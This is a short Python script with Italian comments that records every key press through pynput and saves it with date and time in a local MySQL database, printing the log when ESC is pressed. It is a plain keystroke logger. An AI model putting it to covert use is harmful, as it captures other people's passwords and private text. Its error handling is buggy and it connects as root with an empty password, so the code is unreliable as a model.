from mysql.connector import *
import datetime
from pynput.keyboard import *

errori = []

def prendi_tasto(tasto):
    try:
        #connetto con mysql
        conn = connect(
            host="localhost",
            password="",
            user="root")
        c = conn.cursor()
        c.execute("CREATE DATABASE IF NOT EXISTS tasti")
        conn.close()
        #ricreo la connessione in modo da poter usare il database
        conn = connect(
            host="localhost",
            password="",
            user="root",
            database="tasti")
        c = conn.cursor()
        #creo la tabella
        c.execute(
                """
                    CREATE TABLE IF NOT EXISTS tasti(
                        tasto VARCHAR(15) NOT NULL,
                        data VARCHAR(30) NOT NULL,
                        ora VARCHAR(30) NOT NULL
                    )
                """
                )
        #rendo il tasto leggibile
        tasto_str = (
            "Spacebar" if tasto == Key.space 
            else tasto.char if hasattr(tasto, 'char') and tasto.char is not None
            else str(tasto).replace("Key.", "")
        )
        #salvo data e ora
        data = datetime.date.today().strftime("%d/%m/%Y")
        ora = datetime.datetime.now().strftime("%H:%M:%S")
        #inserisco i dati nel database
        c.execute(
            "INSERT INTO tasti (tasto, data, ora) VALUES (%s, %s, %s)",
            (tasto_str, data, ora)
        )
        #committo le modifiche
    #gestisco errori
    except:
        errori.append(tasto_str)
        for i in errori:
            c.execute("INSERT INTO tasti (tasto, data, ora) VALUES (%s, %s, %s)", (i, data, ora))
    conn.commit()
    if tasto == Key.esc:
        #chiudo la connessione e il listener se viene premuto il tasto ESC
        c.execute('SELECT * FROM tasti')
        for riga in c.fetchall():
            print(riga)
        conn.close()
        return False


def avvia_listener():
    #avvio il listener
    with Listener(on_press=prendi_tasto) as listener:
        listener.join()